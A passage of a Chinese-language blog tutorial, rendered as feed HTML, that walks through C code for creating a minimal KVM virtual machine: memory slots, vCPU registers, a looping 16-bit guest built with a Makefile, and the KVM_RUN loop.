class="hljs-keyword">struct</span> <span class="hljs-title">kvm_sregs</span> <span class="hljs-title">sregs</span>;</span>               <span class="hljs-comment">// 虚拟CPU特殊寄存器的状态</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_regs</span> <span class="hljs-title">regs</span>;</span>                 <span class="hljs-comment">// 虚拟CPU通用寄存器的状态</span><br>&#125;;<br><br><span class="hljs-comment">// 全局变量，记录打开的/dev/kvm文件描述符，用于与内核通信</span><br><span class="hljs-keyword">int</span> g_dev_fd;<br><br></code></pre></td></tr></table></figure><p>main函数首先对这些变量进行了初始化，然后调用setup_vm开始组装机器了。组装好机器后，调用load_image加载Guest的镜像到内存中，最后调用run_rm开始执行Guest：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>    <span class="hljs-comment">// 打开KVM设备文件，获取文件描述符用于与内核通信</span><br>    <span class="hljs-keyword">if</span> ((g_dev_fd = open(<span class="hljs-string">&quot;/dev/kvm&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to open KVM device.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 分配内存并初始化虚拟机结构体</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> *<span class="hljs-title">vm</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct vm));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(struct vcpu));<br>    vcpu-&gt;id = <span class="hljs-number">0</span>;<br>    vm-&gt;vcpu[<span class="hljs-number">0</span>] = vcpu;<br><br>    <span class="hljs-comment">// 设置虚拟机的内存大小和初始化</span><br>    setup_vm(vm, <span class="hljs-number">64000000</span>);<br><br>    <span class="hljs-comment">// 载入虚拟机的镜像</span><br>    load_image(vm);<br><br>    <span class="hljs-comment">// 运行虚拟机</span><br>    run_vm(vm);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-1-创建虚拟机实例"><a href="#1-5-1-创建虚拟机实例" class="headerlink" title="1.5.1 创建虚拟机实例"></a>1.5.1 创建虚拟机实例</h3><p>这段代码用于创建一个虚拟机实例，首先调用 <code>ioctl</code> 函数发送 <code>KVM_CREATE_VM</code> 命令给内核的 KVM 子系统，从而在内核中创建了一个虚拟机实例，并<strong>返回了虚拟机实例的文件描述符</strong>。在后续的代码中，可以通过这个文件描述符来操作该虚拟机实例</p><p>最初创建的虚拟机只是一个空机箱，既没有内存，也没有处理器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">// 设置虚拟机，包括分配内存、初始化虚拟机结构等</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 通过ioctl调用KVM_CREATE_VM命令创建虚拟机实例</span><br>    <span class="hljs-keyword">if</span> ((vm-&gt;vm_fd = ioctl(g_dev_fd, KVM_CREATE_VM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// ... 其他设置虚拟机的代码 ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-2-创建内存"><a href="#1-5-2-创建内存" class="headerlink" title="1.5.2 创建内存"></a>1.5.2 创建内存</h3><p>组装机器，首先是内存，就像需要在内存槽上插上内存条一样，我们也需要为我们的虚拟机安装内存。KVM为用户空间工具配置虚拟机内存定义的数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">6f</span>c138d2278078990f597cb1f62fde9e5b458f96<br>KVM: Support assigning userspace memory to the guest<br>linux.git/include/linux/kvm.h<br><br><span class="hljs-comment">// 结构体定义，用于配置虚拟机内存</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_userspace_memory_region</span> &#123;</span><br>    __u32 slot;                  <span class="hljs-comment">// 内存槽编号</span><br>    __u32 flags;                 <span class="hljs-comment">// 内存的标志和属性</span><br>    __u64 guest_phys_addr;       <span class="hljs-comment">// 内存在虚拟机物理地址空间的起始地址</span><br>    __u64 memory_size;           <span class="hljs-comment">// 内存大小（以字节为单位）</span><br>    __u64 userspace_addr;        <span class="hljs-comment">// 内存在宿主机中的起始地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这段代码定义了一个结构体，用于配置虚拟机中的内存区域。其中，<code>slot</code> 字段表示内存槽编号，用于标识内存的插槽。<code>flags</code> 字段表示内存的类型和属性，如 <code>KVM_MEM_READONLY</code> 表示只读内存。<code>guest_phys_addr</code> 字段指定插入的内存在虚拟机的物理地址空间中的起始地址。<code>memory_size</code> 字段表示内存的大小，以字节为单位。<code>userspace_addr</code> 字段表示宿主机中分配的内存的起始地址，用于在宿主机和虚拟机之间进行内存映射。</p><p>下面这段代码的主要功能是为虚拟机配置物理内存。它首先使用 <code>mmap</code> 分配一段按照页面尺寸对齐的内存作为虚拟机的物理内存。然后，通过 <code>KVM_SET_USER_MEMORY_REGION</code> API，将这块内存插入虚拟机的内存槽中。在 <code>setup_vm</code> 函数中，填充了虚拟机内存配置结构体 <code>vm-&gt;mem</code> 的各个字段，包括内存槽编号、内存大小、内存在虚拟机物理地址空间的起始地址以及在宿主机中的起始地址。最后，通过 <code>ioctl</code> 调用将内存配置信息传递给 KVM 子系统，将这块内存插入虚拟机的0号槽（使用mmap分配了一段按照页面尺寸对齐的64MB的内存作为虚拟机的物理内存。然后通过KVM子系统为用户空间配置虚拟机内存提供的API KVM_SET_USER_MEMORY_REGION，为虚拟机在0号槽上插入一条内存）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><span class="hljs-comment">// 准备虚拟机的物理内存</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    vm-&gt;ram_size = ram_size;<br><br>    <span class="hljs-comment">// 通过 mmap 分配页面对齐的内存作为虚拟机的物理内存</span><br>    vm-&gt;ram_start = (__u64)mmap(<span class="hljs-literal">NULL</span>, vm-&gt;ram_size,<br>                                 PROT_READ | PROT_WRITE, MAP_PRIVATE |<br>                                 MAP_ANONYMOUS | MAP_NORESERVE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">void</span> *)vm-&gt;ram_start == MAP_FAILED) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to map memory for vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 配置虚拟机内存</span><br>    vm-&gt;mem.slot = <span class="hljs-number">0</span>;                       <span class="hljs-comment">// 内存槽编号</span><br>    vm-&gt;mem.guest_phys_addr = <span class="hljs-number">0</span>;            <span class="hljs-comment">// 内存在虚拟机物理地址空间的起始地址</span><br>    vm-&gt;mem.memory_size = vm-&gt;ram_size;     <span class="hljs-comment">// 内存大小</span><br>    vm-&gt;mem.userspace_addr = vm-&gt;ram_start; <span class="hljs-comment">// 内存在宿主机中的起始地址</span><br><br>    <span class="hljs-comment">// 使用 KVM_SET_USER_MEMORY_REGION API 将内存插入虚拟机的0号槽</span><br>    <span class="hljs-keyword">if</span> ((ioctl(vm-&gt;vm_fd, KVM_SET_USER_MEMORY_REGION, &amp;(vm-&gt;mem))) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set memory for vm.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="1-5-3-创建处理器"><a href="#1-5-3-创建处理器" class="headerlink" title="1.5.3 创建处理器"></a>1.5.3 创建处理器</h3><p>KVM模块为用户空间提供的API为KVM_CREATE_VCPU，这个API接收一个参数vcpu id，本质上是lapci id：</p><p>在 <code>setup_vm</code> 函数中，首先获取虚拟机中的第一个处理器实例，然后通过 <code>KVM_CREATE_VCPU</code> 命令，为虚拟机创建一个处理器。创建后，处理器的文件描述符 <code>fd</code> 将用于与该处理器实例进行交互。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 为虚拟机配置处理器</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-comment">// 获取虚拟机中的第一个处理器</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vcpu</span> *<span class="hljs-title">vcpu</span> =</span> vm-&gt;vcpu[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">// 通过 KVM_CREATE_VCPU 命令，为虚拟机创建一个处理器实例</span><br>    vcpu-&gt;fd = ioctl(vm-&gt;vm_fd, KVM_CREATE_VCPU, vcpu-&gt;id);<br>    <span class="hljs-keyword">if</span> (vcpu-&gt;fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to create cpu for vm.\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// ... other setup ...</span><br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在虚拟处理器创建完成后，我们需要告知处理器从虚拟机内存的哪个位置开始执行指令。这可以通过直接设置代码段（cs）和指令指针（RIP）来实现，而不需要按照传统的方式执行，如处理器重置后从地址0xFFFFFFF0开始执行。在x86架构中，KVM为虚拟处理器的寄存器定义了两个结构体，其中一个是<code>struct kvm_sregs</code>，该结构体被称为特殊寄存器（special registers），它包括了各种段寄存器、控制寄存器等。代码段寄存器<code>cs</code> 就在这个结构体中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">linux.git/include/linux/kvm.h<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_sregs</span> &#123;</span><br> <span class="hljs-comment">/* in */</span><br>__u32 vcpu;<br>__u32 padding;<br><br><span class="hljs-comment">/* out (KVM_GET_SREGS) / in (KVM_SET_SREGS) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_segment</span> <span class="hljs-title">cs</span>, <span class="hljs-title">ds</span>, <span class="hljs-title">es</span>, <span class="hljs-title">fs</span>, <span class="hljs-title">gs</span>, <span class="hljs-title">ss</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_segment</span> <span class="hljs-title">tr</span>, <span class="hljs-title">ldt</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_dtable</span> <span class="hljs-title">gdt</span>, <span class="hljs-title">idt</span>;</span><br><br>__u64 cr0, cr2, cr3, cr4, cr8;<br>__u64 efer;<br>__u64 apic_base;<br>__u64 interrupt_bitmap[KVM_IRQ_BITMAP_SIZE(__u64)];<br>&#125;;<br></code></pre></td></tr></table></figure><p>通用寄存器、标志寄存器，以及前面刚刚提到的指令指针寄存器<br>eip定义在另一个结构体kvm_regs中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>linux.git/include/linux/kvm.h<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_regs</span> &#123;</span><br><span class="hljs-comment">/* in */</span><br>__u32 vcpu;<br>__u32 padding;<br><span class="hljs-comment">/* out (KVM_GET_REGS) / in (KVM_SET_REGS) */</span><br>__u64 rax, rbx, rcx, rdx;<br>__u64 rsi, rdi, rsp, rbp;<br>__u64 r8, r9, r10, r11;<br>__u64 r12, r13, r14, r15;<br>__u64 rip, rflags;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在系统启动时，首先进入16位实模式，并在后续将Guest加载到段地址为0x1000、偏移地址为0的内存位置。为了实现这个目标，代码中使用了KVM API来设置虚拟处理器的寄存器值，包括代码段寄存器（cs）和指令指针寄存器（RIP），以及一些附加操作。下面是对文字和代码的解释和注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setup_vm</span><span class="hljs-params">(struct vm *vm, <span class="hljs-keyword">int</span> ram_size)</span> </span>&#123;<br>…<br><span class="hljs-comment">// 通过 ioctl 获取虚拟处理器的特殊寄存器（special registers）</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_GET_SREGS, &amp;(vcpu-&gt;sregs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to get sregs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// 设置代码段寄存器 cs</span><br>vcpu-&gt;sregs.cs.selector = <span class="hljs-number">0x1000</span>;         <span class="hljs-comment">// 设置代码段选择子为0x1000</span><br>vcpu-&gt;sregs.cs.base = <span class="hljs-number">0x1000</span> &lt;&lt; <span class="hljs-number">4</span>;       <span class="hljs-comment">// 设置代码段基地址为0x1000 &lt;&lt; 4 = 0x10000</span><br><br><span class="hljs-comment">// 将更新后的 sregs 重新设置给虚拟处理器</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_SET_SREGS, &amp;(vcpu-&gt;sregs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set sregs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// 通过 ioctl 获取虚拟处理器的通用寄存器（general-purpose registers）</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_GET_REGS, &amp;(vcpu-&gt;regs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to get regs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br>vcpu-&gt;regs.rip = <span class="hljs-number">0x0</span>;               <span class="hljs-comment">// 设置指令指针初始值为0</span><br>vcpu-&gt;regs.rflags = <span class="hljs-number">0x2</span>;            <span class="hljs-comment">// 设置 rflags 寄存器，保留第2位，其余位初始化为0</span><br><br><span class="hljs-comment">// 将更新后的 regs 重新设置给虚拟处理器</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_SET_REGS, &amp;(vcpu-&gt;regs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set regs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// ... 其他设置 ...</span><br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-4-Guest"><a href="#1-5-4-Guest" class="headerlink" title="1.5.4 Guest"></a>1.5.4 Guest</h3><p>实现一个非常小的Guest：这个Guest就是一个简单的无限循环</p><p>这个Guest的内核中没有任何文件格式解码器，需要将Guest编译为无格式的，因此我们需要使用objcopy从ELF格式转换为binary格式，代码从地址0开始。这个Guest没有任何依赖，所以不连接任何其他的第三方库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// guest/kernel.S</span><br>.code16gcc<br>.text<br>.globl _start<br>.type _start, @function<br>_start:<br><span class="hljs-number">1</span>:<br>jmp <span class="hljs-number">1b</span>       <span class="hljs-comment">// 无限循环，不断跳转到标号1处，创建一个简单的无限循环。</span><br><br><span class="hljs-comment">// Makefile 文件用于编译和生成 Guest 内核的可执行文件。</span><br><span class="hljs-comment">// guest/Makefile</span><br>BIN := kernel.bin<br>ELF := kernel.elf<br>OBJ := kernel.o<br><br>all: $(BIN)   <span class="hljs-comment">// 定义默认目标 all，生成 kernel.bin 可执行文件。</span><br><br>$(BIN): $(ELF) <span class="hljs-comment">// 生成 kernel.bin 依赖于 kernel.elf 文件。</span><br>    objcopy -O binary $&lt; $@ <span class="hljs-comment">// 使用 objcopy 将 ELF 文件转换为 binary 格式。</span><br><br>$(ELF): $(OBJ) <span class="hljs-comment">// 生成 kernel.elf 依赖于 kernel.o 目标文件。</span><br>    $(LD) -Ttext=<span class="hljs-number">0x00</span> -nostdlib -<span class="hljs-keyword">static</span> $&lt; -o $@ <span class="hljs-comment">// 链接目标文件</span><br><br>%.o: %.S <span class="hljs-comment">// 定义一般规则，用于将汇编文件编译为目标文件。</span><br>    $(CC) -nostdinc -c $&lt; -o $@<br><br>clean: <span class="hljs-comment">// 定义 clean 目标，用于清除生成的文件。</span><br>    rm -rf $(OBJ) $(BIN) $(ELF)<br><br></code></pre></td></tr></table></figure><h3 id="1-5-5-加载Guest镜像到内存"><a href="#1-5-5-加载Guest镜像到内存" class="headerlink" title="1.5.5 加载Guest镜像到内存"></a>1.5.5 加载Guest镜像到内存</h3><p>初始化VCPU时我们将代码段cs设置为0xf000，将rip设置为0，所以这里需要将Guest镜像加载到Guest的内存地址(0x1000＜＜4)+0x0处。Guest的物理内存的起始地址为ram_start，所以加载Guest镜像到内存的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">load_image</span><span class="hljs-params">(struct vm *vm)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;./guest/kernel.bin&quot;</span>, O_RDONLY); <span class="hljs-comment">// 打开Guest镜像文件</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can not open guest image\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 计算Guest加载到内存的物理地址</span><br>    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)vm-&gt;ram_start + ((<span class="hljs-number">0x1000</span> &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x0</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// 从文件中读取数据并写入内存</span><br>        <span class="hljs-keyword">if</span> ((ret = read(fd, p, <span class="hljs-number">4096</span>)) &lt;= <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>        p += ret; <span class="hljs-comment">// 更新内存指针</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码的目的是将Guest镜像文件加载到虚拟机的内存中。它首先<strong>打开名为 “./guest/kernel.bin” 的Guest镜像文件</strong>，然后通过计算得到Guest镜像应该加载到内存中的物理地址。接下来，通过循环从文件中读取数据，每次最多读取 4096 字节（一个页面的大小），然后将读取的数据写入到内存中。这个过程会一直进行，直到文件的内容被完全读取并写入内存，或者发生了读取错误。在每次循环中，内存指针会被更新，以便在下次循环中写入数据的时候不会覆盖之前的数据。</p><h3 id="1-5-6-运行虚拟机"><a href="#1-5-6-运行虚拟机" class="headerlink" title="1.5.6 运行虚拟机"></a>1.5.6 运行虚拟机</h3><p>下面是对代码和文本的详细解释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 启动虚拟机的函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_vm</span><span class="hljs-params">(struct vm *vm)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// 使用 ioctl 调用 KVM_RUN 命令来启动虚拟机运行</span><br>        <span class="hljs-keyword">if</span> ((ioctl(vm-&gt;vcpu[<span class="hljs-number">0</span>]-&gt;fd, KVM_RUN, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to run kvm.\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码中的函数 <code>run_vm</code> 是用来启动虚拟机的。它进入了一个无限的循环，每次循环都通过 ioctl 调用发送 KVM_RUN 命令，从而启动虚拟机的运行。在这个循环中，虚拟机会被不断地执行，直到某个条件使得虚拟机退出到用户空间。</p><p>在解释完代码后，接下来是对操作步骤的解释：</p><ol><li>编译 kmm.c 文件：通过执行命令 <code>gcc kvm.c -o kvm</code>，将 <code>kvm.c</code> 编译成名为 <code>kvm</code> 的可执行文件。</li><li>运行虚拟机：通过执行命令 <code>sudo ./kvm</code>，以超级用户权限运行生成的可执行文件。</li><li>在另一个终端中运行 <code>pidstat</code> 命令：执行命令 <code>pidstat -p</code> pidof kvm <code>1</code>，监视虚拟机进程的资源使用情况。其中 <code>-p</code> pidof kvm`` 参数指定要监视的进程号，<code>1</code> 表示每秒输出一次监视结果。</li><li>观察监视结果：如果一切正常，<code>pidstat</code> 命令的输出会显示每个采样时刻的虚拟机进程的资源利用率。在正常情况下，由于虚拟机中只有一个简单的无限循环，它不会主动触发陷入，因此虚拟机的 CPU 利用率会接近 100%。同时，由于虚拟机并没有进行复杂的操作，因此在 Host 系统态（%system）方面的资源使用率会非常低，接近 0。</li></ol><p>这个过程展示了如何使用 KVM 在用户空间创建一个简单的虚拟机，并让虚拟机在无限循环中运行，从而实现虚拟化。</p><h1 id="二、内存虚拟化"><a href="#二、内存虚拟化" class="headerlink" title="二、内存虚拟化"></a>二、内存虚拟化</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Git的使用</title>
    <link href="/p/3645f6a9/"/>
    <url>/p/3645f6a9/</url>
    
